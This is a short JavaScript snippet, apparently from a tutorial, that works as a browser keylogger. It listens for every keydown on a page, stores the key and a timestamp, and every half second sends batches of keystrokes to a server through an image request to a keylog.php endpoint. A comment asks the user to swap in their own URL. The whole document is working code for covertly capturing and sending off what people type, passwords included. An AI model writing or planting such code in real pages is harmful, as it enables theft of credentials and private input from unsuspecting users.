// Record all key presses into an array
var presses = [];
window.addEventListener("keydown", function(evt){
  presses.push({
    t: Math.round((new Date()).getTime() / 1000),
    k: evt.key
  });
});
 
// Push to server at regular intervals
// Reduce interval timing for more frequent recordings, but increases server load
// You can also set this to send only if certain number of key stroke were made.
window.setInterval(function () {
  if (presses.length>5) {
    var data = encodeURIComponent(JSON.stringify(presses));
    // console.log(data);
    new Image().src = "http://localhost/test/keylog.php?k=" + data; // CHANGE THIS URL TO YOUR OWN!
    presses = [];
  }
}, 500);
